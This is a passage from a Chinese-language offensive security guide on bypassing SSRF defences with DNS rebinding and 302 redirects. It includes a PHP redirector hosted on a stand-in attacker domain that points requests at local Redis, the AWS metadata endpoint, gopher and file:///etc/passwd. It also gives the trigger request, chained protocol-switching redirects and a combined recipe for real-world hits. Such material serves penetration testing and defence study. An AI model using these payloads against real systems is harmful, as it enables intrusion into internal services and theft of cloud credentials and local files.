# 自建工具:singularity / dns-rebind / rbndr
```

**何时用**:
- 后端代码出现 `parse_url + gethostbyname + 白名单 + curl_exec` 两段式
- WAF 只看请求 URL 的字面 host,不看实际连接到的 IP
- AWS metadata(169.254.169.254)被字面 blacklist 时

#### 3. 302 重定向跟随绕过

服务端只对**用户提交的 URL**做校验,但 `curl --location` / `requests follow_redirects=True` 会跟随 302 跳到任意 URL。在攻击者域上挂 `header("Location: http://internal/")` 即可。

```php
<?php
// 攻击者控制的服务 — attacker.example/redir.php
header("Location: http://127.0.0.1:6379/");   // Redis
// header("Location: http://169.254.169.254/latest/meta-data/");  // AWS metadata
// header("Location: gopher://127.0.0.1:6379/_...");  // gopher 内网横向
// header("Location: file:///etc/passwd");  // file:// 本地读
exit;
```

```text
# 触发:在 SSRF 输入框填 attacker 域,后端校验通过(指向公网)→ 跟随重定向到内网
POST /fetch HTTP/1.1
url=https://attacker.example/redir.php

# 链式重定向规避协议限制:
# 后端只允许 https → attacker.example/redir1 (https)
#                → attacker.example/redir2 (http)  ← 协议切换
#                → http://127.0.0.1:6379/  ← 最终落点
```

**变种**:
- HTTP `Refresh:` 头(部分 HTTP 客户端跟随)
- HTML `<meta http-equiv="refresh">`(headless 渲染场景)
- 30x 链多跳,中间穿插不同协议(http → https → http → gopher / dict / file)

**真实命中要点(三件套合体)**:
1. 用 **UA 头**找有内部分支的接口(看响应特征)
2. 用 **DNS 重绑定**绕过字面 IP 黑名单
3. 用 **302 重定向**绕过协议白名单 + 触发 gopher / file 落点

OOB 验证用厂商提供的 SSRF 测试平台或自架 interactsh,不要用公共 DNSLog。

---
